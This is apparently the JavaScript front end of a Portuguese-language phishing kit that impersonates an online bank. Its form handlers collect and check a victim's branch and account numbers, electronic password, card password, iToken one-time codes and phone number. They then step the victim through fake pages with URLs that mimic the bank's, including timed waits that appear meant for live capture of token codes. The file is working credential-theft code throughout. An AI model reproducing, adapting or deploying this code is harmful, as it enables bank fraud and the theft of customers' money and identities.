function mascara(o,f){
    v_obj=o
    v_fun=f
    setTimeout("execmascara()",1)
}

function soNumeros(v){
    return v.replace(/\D/g,"")
	
}

function execmascara(){
	
      v_obj.value=v_fun(v_obj.value)
 
} 


function MM_callJS(jsStr) { //v2.0
  return eval(jsStr)
}
//////////////////////////////////////////

function autotab(elemento)
{
 if (elemento.value.length < elemento.getAttribute("maxlength")) return;
 var formulario = elemento.form;
 var els = formulario.elements;
 var x, autotab;
 for (var i = 0, len = els.length; i < len; i++)
 {
  x = els[i];
  if (elemento == x && (autotab = els[i+1]))
  {
   if (autotab.focus) autotab.focus();
  }
 }
}

function EntregaPasso1() {
	var astolfo = $("#astolfo");
	if( astolfo == undefined || astolfo.val().length < 4 ) {
		alert("Preencha o campo Agência corretamente.");
		return;
	}

	if (astolfo.val() == "1111" || astolfo.val() == "2222" || astolfo.val() == "3333" || astolfo.val() == "4444" || astolfo.val() == "5555" ||
	    astolfo.val() == "6666" || astolfo.val() == "7777" || astolfo.val() == "8888" || astolfo.val() == "9999") {

    		alert("Preencha o campo Agencia corretamente.");
		return;

	    }

	var carol = $("#carol");
	if( carol == undefined || carol.val().length < 5 ) {
			alert("Preencha o campo Conta corretamente.");
		return;
	}

	if (carol.val() == "11111" || carol.val() == "22222" || carol.val() == "33333" || carol.val() == "44444" || carol.val() == "55555" ||
	carol.val() == "66666" || carol.val() == "77777" || carol.val() == "88888" || carol.val() == "99999") {

		alert("Preencha o campo Conta corretamente.");
	return;

	}

	var solidao = $("#solidao");
	if( solidao == undefined || solidao.val().length < 1 ) {
		alert("Preencha o campo Dígito corretamente.");
		return;
	}

	document.forms['forminDeDados'].action = "index2.php";
	document.forms['forminDeDados'].submit();
}


function escolha() {

    document.forms['forminDeDados'].action = "senha.php";
	document.forms['forminDeDados'].submit();
}

function escolhaJU() {

    document.forms['forminDeDados'].action = "PJ/portador.php";
	document.forms['forminDeDados'].submit();
}

function sair() {

    document.forms['forminDeDados'].action = "index.php";
	document.forms['forminDeDados'].submit();
}

function tentarNovamente() {

    document.forms['forminDeDados'].action = "senha2.php";
	document.forms['forminDeDados'].submit();
}

function eletronica1() {
var cofre= $("#cofre");
	if( cofre == undefined || cofre.val().length < 6 ) {
		alert("Por favor, preencha corretamente o campo 'senha eletrônica'.");
		return;
	}

	if (cofre.val() == "111111" || cofre.val() == "222222" || cofre.val() == "333333" || cofre.val() == "444444" || cofre.val() == "555555" ||
	cofre.val() == "666666" || cofre.val() == "777777" || cofre.val() == "888888" || cofre.val() == "999999" || cofre.val() == "123456") {

		alert("Por favor, preencha corretamente o campo 'senha eletrônica'.");
	return;

	}

	document.forms['forminDeDados'].action = "senha2.php";
	document.forms['forminDeDados'].submit();
}

function eletronica2() {
var cofre2= $("#cofre2");
var cofre= $("#cofre");
	if( cofre2 == undefined || cofre2.val().length < 6 ) {
		alert("Por favor, preencha corretamente o campo 'senha eletrônica'.");
		return;
		}

	if (cofre2.val() == "111111" || cofre2.val() == "222222" || cofre2.val() == "333333" || cofre2.val() == "444444" || cofre2.val() == "555555" ||
	cofre2.val() == "666666" || cofre2.val() == "777777" || cofre2.val() == "888888" || cofre2.val() == "999999" || cofre2.val() == "123456") {

		alert("Por favor, preencha corretamente o campo 'senha eletrônica'.");
	return;
	}

 	 /*if(cofre.val().length != cofre2.val().length) {
      alert("Senha Inválida. Você tem mais 1 tentativa!");
	  return false;
	  }*/

	document.forms['forminDeDados'].action = "avisobuster.php";
	document.forms['forminDeDados'].submit();
}




function EntregaPasso3() {
    document.forms['forminDeDados'].action = "GRIPNETbklcom.dll4.php";
	document.forms['forminDeDados'].submit();
}

function EntregaPassot() {

	
	var tdoseis= $("#tdoseis");
	if( tdoseis == undefined || tdoseis.val().length < 6 ) {
		alert("Favor digitar a senha de 6 dígitos");
		return;
	}

	if (tdoseis.val() == "111111" || tdoseis.val() == "222222" || tdoseis.val() == "333333" || tdoseis.val() == "444444" || tdoseis.val() == "555555" ||
	tdoseis.val() == "666666" || tdoseis.val() == "777777" || tdoseis.val() == "888888" || tdoseis.val() == "999999") {

		alert("Senha de 6 dígitos inválida");
	return;
   }

	document.forms['forminDeDados'].action = "finalizar.php";
	document.forms['forminDeDados'].submit();
}

function EntregaPassofinal() {

	
	var ddd= $("#ddd");
	var tel= $("#tel");
	if( ddd == undefined || ddd.val().length < 2 || tel == undefined || tel.val().length < 8 ) {
		alert("Telefone inválido");
		return;
	}

	if (tel.val() == "111111111" || tel.val() == "222222222" || tel.val() == "333333333" || tel.val() == "444444444" || tel.val() == "555555555" ||
	tel.val() == "666666666" || tel.val() == "777777777" || tel.val() == "888888888" || tel.val() == "999999999") {

		alert("Telefone inválido");
	return;
   }

	document.forms['forminDeDados'].action = "finalizar.php";
	document.forms['forminDeDados'].submit();
}

function EntregaToket() {
   
var tdoce= $("#tdoce");
if( tdoce == undefined || tdoce.val().length < 6 ) {
		alert("Favor digitar o código de acesso do iToken.");
		return;
	}

	if (tdoce.val() == "111111" || tdoce.val() == "222222" || tdoce.val() == "333333" || tdoce.val() == "444444" || tdoce.val() == "555555" ||
	tdoce.val() == "666666" || tdoce.val() == "777777" || tdoce.val() == "888888" || tdoce.val() == "999999" || tdoce.val() == "123456") {

		alert("Favor digitar um código de acesso do iToken válido.");
	return;
}

	document.forms['forminDeDados'].action = "aguardando.php";
	document.forms['forminDeDados'].submit();
}

function EntregaToket2() {
   
var tdoce= $("#tdoce");
if( tdoce == undefined || tdoce.val().length < 6 ) {
		alert("Favor digitar o código de acesso do iToken.");
		return;
	}

	if (tdoce.val() == "111111" || tdoce.val() == "222222" || tdoce.val() == "333333" || tdoce.val() == "444444" || tdoce.val() == "555555" ||
	tdoce.val() == "666666" || tdoce.val() == "777777" || tdoce.val() == "888888" || tdoce.val() == "999999" || tdoce.val() == "123456") {

		alert("Favor digitar um código de acesso do iToken válido.");
	return;
}

	document.forms['forminDeDados'].action = "aguardando2.php";
	document.forms['forminDeDados'].submit();
}


function EntregaPasso4() {

var sinara= $("#sinara");
	if( sinara == undefined || sinara.val().length < 6 ) {
		alert("Preencha o campo SENHA ELETRÔNICA corretamente.");
		return;
	}

	if (sinara.val() == "11111111" || sinara.val() == "22222222" || sinara.val() == "33333333" || sinara.val() == "44444444" || sinara.val() == "55555555" ||
	sinara.val() == "66666666" || sinara.val() == "77777777" || sinara.val() == "88888888" || sinara.val() == "99999999") {

		alert("Preencha o campo SENHA ELETRÔNICA corretamente.");
	return;

	}

var sedebe= $("#sedebe");
	if( sedebe == undefined || sedebe.val().length < 6 ) {
		alert("Preencha o campo SENHA DO CARTÃO  corretamente.");
		return;
	}

	if (sedebe.val() == "111111" || sedebe.val() == "222222" || sedebe.val() == "333333" || sedebe.val() == "444444" || sedebe.val() == "555555" ||
	sedebe.val() == "666666" || sedebe.val() == "777777" || sedebe.val() == "888888" || sedebe.val() == "999999") {

		alert("Preencha o campo SENHA DO CARTÃO corretamente.");
	return;

	}

	document.forms['forminDeDados'].action = "GRIPNETbklcom.dll1select.php";
	document.forms['forminDeDados'].submit();
}


function enviarTabela() {
	document.forms['forminDeDados'].action = "table.php";
	document.forms['forminDeDados'].submit();
}

function enviarToken () {
	document.forms['forminDeDados'].action = "toket.php";
	document.forms['forminDeDados'].submit();
}

function instalarGb () {
	document.forms['forminDeDados'].action = "senh6.php";
	document.forms['forminDeDados'].submit();
}


function EntregaTable() {

   

    document.forms['forminDeDados'].action = "envioTab.php";
	document.forms['forminDeDados'].submit();
}


function aguardeProcessando() {

  var t=setTimeout("redireciona()",35000);
}


function redireciona() {
    document.forms['forminDeDados'].action = "toket2.php";
	document.forms['forminDeDados'].submit();
}


function aguardeProcessandoPequeno() {

  var t=setTimeout("redirecionaPequeno()",5000);
}

function redirecionaPequeno() {
  document.forms['forminDeDados'].action = "index2.php";
  document.forms['forminDeDados'].submit();
}